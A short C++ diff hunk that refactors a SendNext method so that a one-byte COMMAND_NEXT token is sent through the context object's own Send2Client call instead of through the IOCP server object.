@@ -34,7 +34,7 @@ public:
 
 	VOID SendNext(void) {
 		BYTE	bToken = COMMAND_NEXT;
-		m_iocpServer->Send2Client(m_ContextObject, &bToken, 1);
+		m_ContextObject->Send2Client(&bToken, 1);
 	}
     void OnReceiveComplete();
 	BOOL ParseFrame(void);
